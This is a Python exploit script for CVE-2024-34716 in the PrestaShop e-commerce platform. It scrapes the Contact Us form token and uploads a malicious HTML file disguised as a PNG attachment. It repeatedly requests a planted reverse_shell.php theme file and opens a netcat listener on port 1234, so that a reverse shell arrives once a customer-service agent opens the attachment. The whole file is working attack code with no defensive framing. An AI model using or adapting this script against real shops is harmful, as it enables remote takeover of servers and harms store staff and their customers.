import argparse, requests, subprocess, time, threading, sys
from bs4 import BeautifulSoup


def usage():
    print("Usage: python script.py <host_url> <email> <message_content> <exploit_path>")
    print("")
    print("Options:")
    print("  host_url          The Presta Shop base url (e.g. http://prestashop:8000)")
    print("  email             The email address of admin user (e.g. admin@prestashop.com)")
    print("  message_content   Message to send in Contact Us form (e.g. 'Hello, I am exploiting you')")
    print("  exploit_path      The path of the exploit HTML (e.g. /path/to/exploit.html)")
    print("")
    print("Example:")
    print("  python exploit.py http://prestashop:8000 admin@example.com 'Hello, I am exploiting you' /path/to/exploit.html")


def __parse_args(argv):
    num_args = len(argv)
    
    if num_args == 1:
        host_url = input("[?] Please enter the URL (e.g., http://prestashop:8000): ")
        email = input("[?] Please enter your email: ")
        message_content = input("[?] Please enter your message: ")
        exploit_path = input("[?] Please provide the path to your HTML file: ")
    elif num_args < 5:
        usage()
        sys.exit(1)
    else:
        parser = argparse.ArgumentParser(description="CVE-2024-34716 Exploit")
        parser.add_argument("host_url", help="The Presta Shop base url.")
        parser.add_argument("email", help="The email address of admin user.")
        parser.add_argument("message_content", help="Message to send in Contact Us form.")
        parser.add_argument("exploit_path", help="The path of the exploit HTML.")
        
        args = parser.parse_args()
        
        host_url = args.host_url
        email = args.email
        message_content = args.message_content
        exploit_path = args.exploit_path

        print("[X] Starting exploit with:")
        print(f"\tUrl: {host_url}")
        print(f"\tEmail: {email}")
        print(f"\tMessage: {message_content}")
        print(f"\tExploit path: {exploit_path}")
                
    return (host_url, email, message_content, exploit_path)
    
    
def main():
    
    host_url, email, message_content, exploit_path = __parse_args(sys.argv)

    
    with open(exploit_path, 'r') as file:
        html_content = file.read()

    url = f"{host_url}/contact-us"

    response = requests.get(url)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': 'token'})['value']
    cookies = response.cookies

    files = {
        'fileUpload': ('test.png', html_content, 'image/png'),
    }

    data = {
        'id_contact': '2',
        'from': email,
        'message': message_content,
        'url': '',
        'token': token,
        'submitMessage': 'Send'
    }

    response = requests.post(url, files=files, data=data, cookies=cookies)

    def send_get_requests(interval=1):
        url = f"{host_url}/themes/next/reverse_shell.php"
        while True:
            try:
                requests.get(url)
            except requests.RequestException as e:
                print(f"Error during GET request: {e}")
            time.sleep(interval)

    thread = threading.Thread(target=send_get_requests)
    thread.daemon = True
    thread.start()

    if response.status_code == 200:
        print(f"[X] Yay! Your exploit was sent successfully!")
        print(f"[X] Once a CS agent clicks on attachment, you'll get a SHELL")
        
        subprocess.call(["nc", "-lnvp", "1234"], shell=False)
        print("[X] netcat is now listening on port 1234. Press Ctrl+C to terminate.")

    else:
        print(f"[!] Failed to send the message. Status code: {response.status_code} Reason: {response.reason}")



if __name__ == "__main__":
    main()